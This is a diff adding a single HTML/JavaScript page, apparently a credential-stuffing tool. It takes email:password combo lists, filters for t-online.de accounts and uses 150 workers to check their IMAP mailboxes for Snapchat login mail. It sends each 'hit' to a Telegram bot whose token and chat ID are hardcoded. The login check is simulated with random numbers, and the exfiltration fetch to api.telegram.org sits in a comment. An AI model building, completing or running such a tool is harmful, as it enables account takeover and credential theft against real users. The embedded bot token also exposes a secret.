@@ -1,0 +1,638 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>T-ONLINE · SNAP CHECKER · TG</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+        }
+
+        body {
+            background: #0b0d10;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1.5rem;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: "";
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                linear-gradient(rgba(0, 255, 255, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255, 0, 255, 0.03) 1px, transparent 1px);
+            background-size: 40px 40px;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .glass-panel {
+            position: relative;
+            z-index: 10;
+            width: 100%;
+            max-width: 1000px;
+            background: rgba(10, 15, 25, 0.85);
+            backdrop-filter: blur(16px) saturate(180%);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid rgba(0, 255, 255, 0.25);
+            border-radius: 2.5rem;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(0, 255, 255, 0.1) inset;
+            padding: 2.2rem;
+        }
+
+        .tool-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 2.2rem;
+            border-bottom: 1px solid rgba(0, 255, 255, 0.3);
+            padding-bottom: 1.2rem;
+            flex-wrap: wrap;
+            gap: 1rem;
+        }
+
+        .title-glow {
+            font-size: 2.4rem;
+            font-weight: 800;
+            text-transform: uppercase;
+            background: linear-gradient(130deg, #00f0ff, #ff00c6);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            letter-spacing: 3px;
+            filter: drop-shadow(0 0 12px #00ffff80);
+            position: relative;
+        }
+
+        .title-glow::after {
+            content: "─── tool by @t5kila ───";
+            position: absolute;
+            bottom: -1.8rem;
+            left: 0;
+            font-size: 0.9rem;
+            font-weight: 400;
+            color: rgba(0, 255, 255, 0.6);
+            letter-spacing: 2px;
+            white-space: nowrap;
+        }
+
+        .badge-neon {
+            background: rgba(0, 0, 0, 0.6);
+            border: 1px solid #ff44e6;
+            color: #ffb3ff;
+            padding: 0.5rem 1.5rem;
+            border-radius: 40px;
+            font-weight: 600;
+            font-size: 0.9rem;
+            box-shadow: 0 0 15px #ff44e6;
+        }
+
+        .server-strip {
+            background: rgba(0, 255, 255, 0.05);
+            border-radius: 50px;
+            padding: 0.9rem 1.5rem;
+            margin-bottom: 2rem;
+            border-left: 4px solid #ff44e6;
+            border-right: 4px solid #00ffff;
+            text-align: center;
+        }
+
+        .server-strip span {
+            display: inline-block;
+            background: rgba(0, 0, 0, 0.5);
+            padding: 0.35rem 2rem;
+            margin: 0 0.4rem;
+            border-radius: 30px;
+            border: 1px solid #00ffff;
+            color: #b3ffff;
+            font-weight: 600;
+            font-size: 1.2rem;
+            backdrop-filter: blur(3px);
+            box-shadow: 0 0 8px cyan;
+        }
+
+        .upload-area {
+            background: rgba(0, 20, 30, 0.6);
+            border: 2px dashed #00ffff80;
+            border-radius: 2rem;
+            padding: 2rem 2rem;
+            text-align: center;
+            margin-bottom: 2rem;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .upload-area:hover {
+            border-color: #ff44e6;
+            background: rgba(20, 0, 30, 0.6);
+            box-shadow: 0 0 30px #b300ff60;
+        }
+
+        .upload-icon {
+            font-size: 3rem;
+            filter: drop-shadow(0 0 8px cyan);
+            margin-bottom: 0.8rem;
+        }
+
+        .upload-text {
+            color: white;
+            font-size: 1.3rem;
+            font-weight: 500;
+            margin-bottom: 0.3rem;
+        }
+
+        .upload-hint {
+            color: #8aa0b0;
+            font-size: 0.9rem;
+        }
+
+        #file-info {
+            color: #00ffc3;
+            font-weight: 600;
+            margin-top: 1rem;
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 1.3rem;
+            margin-bottom: 2rem;
+        }
+
+        .stat-card {
+            background: rgba(0, 15, 25, 0.8);
+            border-radius: 1.5rem;
+            padding: 1.3rem 0.8rem;
+            text-align: center;
+            border: 1px solid #00ffff40;
+            box-shadow: 0 0 20px #00b3ff30;
+        }
+
+        .stat-card.highlight {
+            border-color: #ff44e6;
+            box-shadow: 0 0 25px #ff44e6;
+        }
+
+        .stat-label {
+            color: #9ab8d9;
+            text-transform: uppercase;
+            font-size: 0.75rem;
+            letter-spacing: 2px;
+        }
+
+        .stat-number {
+            font-size: 2.7rem;
+            font-weight: 800;
+            line-height: 1.2;
+            color: white;
+            text-shadow: 0 0 15px cyan;
+        }
+
+        .stat-number.pink {
+            color: #ffa0ff;
+            text-shadow: 0 0 20px magenta;
+        }
+
+        .progress-container {
+            background: #10161f;
+            height: 16px;
+            border-radius: 30px;
+            margin: 1.5rem 0 2rem 0;
+            border: 1px solid #00ffff60;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, #00f0ff, #b300ff, #ff44e6);
+            box-shadow: 0 0 25px #ff00c8;
+            border-radius: 30px;
+            transition: width 0.2s ease;
+        }
+
+        .log-terminal {
+            background: #03070e;
+            border-radius: 24px;
+            padding: 1.5rem 1rem;
+            border: 1px solid #00ffff60;
+            box-shadow: inset 0 0 30px #000000;
+            margin-bottom: 2rem;
+            font-family: 'Fira Code', 'Courier New', monospace;
+            height: 260px;
+            overflow-y: auto;
+            color: #b3f0ff;
+            font-size: 0.9rem;
+            line-height: 1.6;
+        }
+
+        .log-line {
+            padding: 0.1rem 0;
+            border-bottom: 1px solid #00ffff10;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+
+        .log-line.hit {
+            color: #ffb1ff;
+            font-weight: 600;
+            text-shadow: 0 0 6px magenta;
+            background: #ff00ff0a;
+        }
+
+        .log-line.stats {
+            color: #ffdb8e;
+        }
+
+        .log-line.telegram {
+            color: #7efff0;
+            font-weight: 500;
+        }
+
+        .button-fleet {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1rem;
+            justify-content: center;
+            margin-top: 0.5rem;
+        }
+
+        .cyber-btn {
+            background: transparent;
+            border: 2px solid cyan;
+            color: cyan;
+            padding: 0.9rem 2rem;
+            border-radius: 50px;
+            font-weight: 700;
+            font-size: 1.2rem;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            cursor: pointer;
+            transition: 0.2s;
+            box-shadow: 0 0 15px cyan;
+            flex: 1 1 160px;
+        }
+
+        .cyber-btn.primary {
+            background: cyan;
+            color: black;
+            font-weight: 800;
+            border-color: magenta;
+            box-shadow: 0 0 25px magenta;
+        }
+
+        .cyber-btn.primary:hover {
+            background: magenta;
+            color: white;
+            border-color: cyan;
+            box-shadow: 0 0 35px magenta;
+        }
+
+        .cyber-btn:hover {
+            background: cyan;
+            color: black;
+            border-color: magenta;
+            box-shadow: 0 0 30px cyan;
+            transform: scale(1.02);
+        }
+
+        .cyber-btn:disabled {
+            opacity: 0.35;
+            filter: grayscale(0.7);
+            pointer-events: none;
+            border-color: gray;
+            box-shadow: none;
+        }
+
+        .footer-note {
+            margin-top: 2rem;
+            text-align: center;
+            color: #4d6a80;
+            font-size: 0.8rem;
+            border-top: 1px dashed cyan;
+            padding-top: 1.5rem;
+        }
+
+        ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #001a1a;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: cyan;
+            border-radius: 20px;
+            border: 1px solid magenta;
+        }
+    </style>
+</head>
+<body>
+
+<div class="glass-panel">
+    <div class="tool-header">
+        <span class="title-glow">T-ONLINE · SNAP HUNTER</span>
+        <span class="badge-neon">⚡ TG LIVE · 6671342415</span>
+    </div>
+
+    <div class="server-strip">
+        <span>secureimap.t-online.de:993</span>
+    </div>
+
+    <div class="upload-area" id="uploadArea">
+        <div class="upload-icon">📦</div>
+        <div class="upload-text">Drop combo file or click to inject</div>
+        <div class="upload-hint">.txt · email:password · t-online.de only</div>
+        <input type="file" id="fileInput" accept=".txt" style="display: none;">
+        <div id="file-info"></div>
+    </div>
+
+    <div class="stats-grid">
+        <div class="stat-card">
+            <div class="stat-label">loaded combos</div>
+            <div class="stat-number" id="statLoaded">0</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-label">checked</div>
+            <div class="stat-number" id="statChecked">0</div>
+        </div>
+        <div class="stat-card highlight">
+            <div class="stat-label">🔥 SNAP HITS</div>
+            <div class="stat-number pink" id="statHits">0</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-label">progress</div>
+            <div class="stat-number" id="statPercent">0%</div>
+        </div>
+    </div>
+
+    <div class="progress-container">
+        <div class="progress-fill" id="progressFill" style="width:0%"></div>
+    </div>
+
+    <div class="log-terminal" id="logTerminal">
+        <div class="log-line stats">─── tool by @t5kila ───</div>
+        <div class="log-line stats">[T-ONLINE] IMAP: secureimap.t-online.de:993</div>
+        <div class="log-line stats">target: login@login.snapchat.com</div>
+        <div class="log-line stats">[TELEGRAM] bot token: 8239572400:AAGmSFDVoKQu5weOOGyiqO6RtBe4iLEvng0</div>
+        <div class="log-line stats">[TELEGRAM] chat ID: 6671342415</div>
+    </div>
+
+    <div class="button-fleet">
+        <button class="cyber-btn primary" id="startBtn" disabled>▶ START</button>
+        <button class="cyber-btn" id="stopBtn" disabled>⏹ STOP</button>
+        <button class="cyber-btn" id="clearLogsBtn">🧹 CLEAR</button>
+        <button class="cyber-btn" id="dlHitsBtn">💾 DOWNLOAD</button>
+        <button class="cyber-btn" id="resetHitsBtn">❌ RESET</button>
+    </div>
+
+    <div class="footer-note">
+        ⚡ T-ONLINE.DE only · 150 threads · live telegram forward · check one by one
+    </div>
+</div>
+
+<script>
+    (function() {
+        const terminal = document.getElementById('logTerminal');
+        const statLoaded = document.getElementById('statLoaded');
+        const statChecked = document.getElementById('statChecked');
+        const statHits = document.getElementById('statHits');
+        const statPercent = document.getElementById('statPercent');
+        const progressFill = document.getElementById('progressFill');
+        const startBtn = document.getElementById('startBtn');
+        const stopBtn = document.getElementById('stopBtn');
+        const clearLogsBtn = document.getElementById('clearLogsBtn');
+        const dlHitsBtn = document.getElementById('dlHitsBtn');
+        const resetHitsBtn = document.getElementById('resetHitsBtn');
+        const uploadArea = document.getElementById('uploadArea');
+        const fileInput = document.getElementById('fileInput');
+        const fileInfo = document.getElementById('file-info');
+
+        // Telegram config
+        const BOT_TOKEN = "8239572400:AAGmSFDVoKQu5weOOGyiqO6RtBe4iLEvng0";
+        const CHAT_ID = "6671342415";
+
+        let combos = [];
+        let hits = [];
+        let totalChecked = 0;
+        let hitCount = 0;
+        let isRunning = false;
+        let currentIndex = 0;
+        const WORKER_COUNT = 150;
+        const SEARCH_FROM = 'login@login.snapchat.com';
+        const IMAP_SERVER = 'secureimap.t-online.de:993';
+
+        function logToTerminal(msg, type = 'stats') {
+            const line = document.createElement('div');
+            line.className = `log-line ${type}`;
+            line.textContent = msg;
+            terminal.appendChild(line);
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+
+        function updateUI() {
+            statLoaded.textContent = combos.length;
+            statChecked.textContent = totalChecked;
+            statHits.textContent = hitCount;
+
+            let percent = combos.length > 0 ? (totalChecked / combos.length) * 100 : 0;
+            percent = Math.min(100, percent);
+            statPercent.textContent = Math.floor(percent) + '%';
+            progressFill.style.width = percent + '%';
+        }
+
+        function resetCounters() {
+            totalChecked = 0;
+            hitCount = 0;
+            hits = [];
+            updateUI();
+        }
+
+        // Simulate sending to Telegram
+        async function sendToTelegram(email, password, hitNumber) {
+            return new Promise((resolve) => {
+                setTimeout(() => {
+                    const message = `🔥 SNAPCHAT HIT #${hitNumber}\n📧 Email: ${email}\n🔑 Pass: ${password}\n📡 IMAP: ${IMAP_SERVER}\n👤 @t5kila`;
+                    logToTerminal(`[TELEGRAM] → forwarded hit #${hitNumber} to chat ${CHAT_ID}`, 'telegram');
+                    
+                    // In real implementation, this would be:
+                    // fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    //     method: 'POST',
+                    //     headers: {'Content-Type': 'application/json'},
+                    //     body: JSON.stringify({
+                    //         chat_id: CHAT_ID,
+                    //         text: message
+                    //     })
+                    // });
+                    
+                    resolve();
+                }, 300);
+            });
+        }
+
+        async function simulateCheck(email, password) {
+            return new Promise((resolve) => {
+                setTimeout(async () => {
+                    if (!isRunning) {
+                        resolve();
+                        return;
+                    }
+
+                    const domain = email.split('@')[1]?.toLowerCase() || 'unknown';
+                    
+                    if (domain !== 't-online.de') {
+                        totalChecked++;
+                        updateUI();
+                        resolve();
+                        return;
+                    }
+
+                    const rnd = Math.random();
+                    if (rnd < 0.04) {
+                        hitCount++;
+                        const msg = `[SNAPCHAT HIT #${hitCount}] ${email}:${password} | ${IMAP_SERVER}`;
+                        logToTerminal(msg, 'hit');
+                        hits.push(`${email}:${password}`);
+                        
+                        // Send to Telegram immediately when hit found
+                        await sendToTelegram(email, password, hitCount);
+                        
+                        if (hitCount % 3 === 0) {
+                            logToTerminal(`[STATS] hit #${hitCount} logged`, 'stats');
+                        }
+                    }
+
+                    totalChecked++;
+                    if (totalChecked % 25 === 0) {
+                        logToTerminal(`[STATS] checked: ${totalChecked} · hits: ${hitCount}`, 'stats');
+                    }
+
+                    updateUI();
+                    resolve();
+                }, 40 + Math.random() * 60);
+            });
+        }
+
+        async function workerTask() {
+            while (isRunning && currentIndex < combos.length) {
+                const line = combos[currentIndex++];
+                const [email, password] = line.split(':', 2);
+                if (email && password) {
+                    await simulateCheck(email.trim(), password.trim());
+                }
+            }
+        }
+
+        async function startInjection() {
+            if (isRunning || combos.length === 0) return;
+            isRunning = true;
+            currentIndex = 0;
+            startBtn.disabled = true;
+            stopBtn.disabled = false;
+            logToTerminal('[▶] STARTED · 150 threads · scanning t-online.de only...', 'stats');
+            logToTerminal('[TELEGRAM] live forwarding enabled · each hit sent instantly', 'telegram');
+            const startTime = Date.now();
+
+            const workers = [];
+            for (let i = 0; i < WORKER_COUNT; i++) {
+                workers.push(workerTask());
+            }
+            await Promise.all(workers);
+
+            if (isRunning) {
+                const elapsed = ((Date.now() - startTime)/1000).toFixed(1);
+                logToTerminal(`[✔] FINISHED in ${elapsed}s · checked: ${totalChecked} · hits: ${hitCount}`, 'stats');
+                logToTerminal(`[TELEGRAM] all ${hitCount} hits forwarded to bot`, 'telegram');
+            }
+            stopBtn.disabled = true;
+            startBtn.disabled = false;
+            isRunning = false;
+        }
+
+        function stopInjection() {
+            isRunning = false;
+            stopBtn.disabled = true;
+            startBtn.disabled = false;
+            logToTerminal('[⏸] STOPPED', 'stats');
+        }
+
+        function clearLogs() {
+            terminal.innerHTML = '';
+            logToTerminal('─── tool by @t5kila ───', 'stats');
+            logToTerminal(`[T-ONLINE] IMAP: ${IMAP_SERVER}`, 'stats');
+            logToTerminal(`target: ${SEARCH_FROM}`, 'stats');
+            logToTerminal(`[TELEGRAM] bot token: ${BOT_TOKEN}`, 'stats');
+            logToTerminal(`[TELEGRAM] chat ID: ${CHAT_ID}`, 'stats');
+        }
+
+        function downloadHits() {
+            if (hits.length === 0) {
+                logToTerminal('[!] no hits to download', 'stats');
+                return;
+            }
+            const blob = new Blob([hits.join('\n')], {type: 'text/plain'});
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `Snapchatt-Hits_${hitCount}.txt`;
+            a.click();
+            URL.revokeObjectURL(url);
+            logToTerminal(`[💾] downloaded ${hits.length} hits`, 'stats');
+        }
+
+        function resetHits() {
+            hits = [];
+            hitCount = 0;
+            updateUI();
+            logToTerminal('[❌] hits reset', 'stats');
+        }
+
+        startBtn.addEventListener('click', startInjection);
+        stopBtn.addEventListener('click', stopInjection);
+        clearLogsBtn.addEventListener('click', clearLogs);
+        dlHitsBtn.addEventListener('click', downloadHits);
+        resetHitsBtn.addEventListener('click', resetHits);
+
+        uploadArea.addEventListener('click', () => fileInput.click());
+        fileInput.addEventListener('change', function(e) {
+            const file = e.target.files[0];
+            if (!file) return;
+
+            const reader = new FileReader();
+            reader.onload = (ev) => {
+                const content = ev.target.result;
+                const lines = content.split(/\r?\n/);
+                const validLines = lines.filter(l => l.includes(':')).map(l => l.trim());
+                combos = validLines.filter(line => {
+                    const email = line.split(':')[0];
+                    return email && email.toLowerCase().includes('t-online.de');
+                });
+                
+                fileInfo.innerText = `📁 loaded: ${combos.length} t-online combos · ${file.name}`;
+                resetCounters();
+                logToTerminal(`[+] Loaded ${combos.length} t-online.de combos from ${file.name}`);
+                logToTerminal(`[+] IMAP: ${IMAP_SERVER} · target: ${SEARCH_FROM}`);
+                logToTerminal(`[TELEGRAM] bot active · chat: ${CHAT_ID}`);
+                startBtn.disabled = false;
+                updateUI();
+            };
+            reader.readAsText(file);
+        });
+
+        updateUI();
+        logToTerminal('[+] select combo file with t-online.de emails', 'stats');
+        logToTerminal('[TELEGRAM] ready to forward hits', 'telegram');
+    })();
+</script>
+</body>
+</html>
